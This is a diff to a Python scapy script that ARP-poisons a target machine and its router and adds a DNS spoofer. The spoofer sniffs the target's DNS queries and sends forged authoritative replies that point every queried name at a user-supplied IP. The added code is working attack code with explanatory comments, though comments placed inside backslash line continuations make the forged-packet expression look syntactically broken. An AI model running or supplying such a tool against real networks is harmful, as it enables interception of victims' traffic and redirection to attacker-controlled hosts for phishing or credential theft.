@@ -16,6 +16,11 @@ cmdParser.add_argument('-r'
                     ,dest='routerIP'
                     ,help='IP address of the router. Ex: -r 192.168.0.100'
                     ,required=True)
+cmdParser.add_argument('-d'
+                    ,'--dns'
+                    ,dest='dnsAddr'
+                    ,help='IP address you would like the DNS spoofer to redirect to. Ex: -d 8.8.8.8'
+                    ,required=True)
 args = cmdParser.parse_args()
 
 def getMAC(ip):
@@ -32,24 +37,38 @@ def arpPoison():
     while True:
         #Resend the ARP response packets every 2 seconds
         time.sleep(2)
- 		#Send packets to both target machine telling it we are the router as 
- 		#well as sending to the router telling it we are the target machine.
- 		#NOTE: IP Forwarding must be on for this!
+        #op=2 indicates it's a ARP response packet (opposed to a request)
+        #sendp function is used since we are crafting an ARP packet that deals with
+        #layer 2 protocol rather than layer 3 (IP)
+        #Don't need to specify our source MAC address, since scapy will fill it
+        #out by default with the current machine's values if we don't specify it.
         sendp((Ether(dst=targetMac)/ARP(op=2, hwdst=targetMac, pdst=args.targetIP, psrc=args.routerIP)),verbose=0)
         sendp(Ether(dst=routerMac)/ARP(op=2, hwdst=routerMac, pdst=args.routerIP, psrc=args.targetIP), verbose=0)
 
 def dnsSniff():
-    sniff(filter="udp and port 53", prn=packetExtract, stop_filter=packetCheck)
+    #Filter to ensure it only captures the target machine's DNS traffic
+    filterDNS = "udp and port 53 and ip src %s" %args.targetIP
+    sniff(filter=filterDNS, prn=packetExtract)
+    #sniff(filter=filterDNS, prn=packetExtract, stop_filter=packetCheck)
 
 def packetExtract(packet):
-    #Show all the DNS packets
-    packet.show()
+    #If you wanted to check on the Ethernet layer for a DNS packet - type: 2048
+    if packet.haslayer(DNS):
+        if packet[DNS].qr == 0:
+            dnsResponse = IP(dst=packet[IP].src, src=packet[IP].dst)/\
+                        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+                        #qr = 1 indicates it's a DNS response
+                        #aa = 1 indicates it should override any other DNS response (router)
+                        DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1,\
+                        #DNSRR = DNS Resource Record (vs DNQR, Question Record)
+                        #Copy the DNS requests' DNS info to the response.
+                        an=DNSRR(rrname=packet[DNS].qd.qname,ttl=1660, rdata=args.dnsAddr))
+            send(dnsResponse, verbose=0)
+            dnsResponse.show()
 
 # def packetCheck(packet):
-#     if Ether in packet[0] and ARP in packet[1]:
-#         arp_sourceIP = packet[ARP].psrc
-#         #If the packet is from the target machine, then ARP poison it.
-#         if arp_sourceIP == args.targetIP:
+#     if packet.haslayer(DNS):
+#         if packet[DNS].qr == 0:
 #             return True
 #     else:
 #         return False
